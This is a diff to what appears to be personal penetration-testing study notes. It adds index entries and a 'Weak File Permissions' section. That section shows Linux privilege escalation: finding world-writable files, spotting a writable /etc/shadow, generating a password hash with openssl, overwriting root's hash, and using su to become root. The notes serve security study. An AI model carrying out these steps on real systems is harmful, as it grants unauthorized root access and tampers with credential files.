@@ -63,6 +63,7 @@ Post-Exploitation
   - [SUID Binaries](#SUID-Binaries)
   - [Token Impersonation](#Token-Impersonation)
   - [UAC Bypass](#UAC-Bypass)
+  - [Weak File Permissions](#Weak-File-Permissions)
 - Maintaining Persistent Access
   - Windows
     - [RDP](#RDP)
@@ -74,6 +75,9 @@ Post-Exploitation
   - [Linux History](#Linux-History)
   - [Resource Scripts](#Resource-Scripts)
   - [Windows Event Logs](#Windows-Event-Logs)
+- [Hash Dumping and Cracking]
+  - Windows
+  - Linux
 - [Keylogging](#Keylogging)
 - [Pivoting](#Pivoting)
 - [Transfer Files](#Transfer-Files)
@@ -1132,6 +1136,28 @@ meterpreter > getsystem
 - Change `LPORT` to avoid conflict with existing session(s).
 - Set `target` to `1` (Windows x64).
 - `getsystem` works in session_2 but UAC flag was still set - why?
+
+### Weak File Permissions
+[<< Index](#Index)
+```
+find / -not -type l -perm -o+w
+
+ls -al /etc/shadow
+-rw-rw-rw- 1 root shadow 551 Jan  3 15:31 /etc/shadow
+```
+- `-o+w` means others have write permissions.
+
+```
+openssl passwd -1 -salt abc password
+$1$abc$BXBqpb9BZcZhXLgbee.0s/
+
+vi /etc/shadow
+root:*:17764:0:99999:7::: --> root:$1$abc$BXBqpb9BZcZhXLgbee.0s/:17764:0:99999:7:::
+
+su
+Password: password
+```
+- Modify `/etc/shadow` by setting root password.
 
 ## Maintaining Persistent Access
 ### Windows
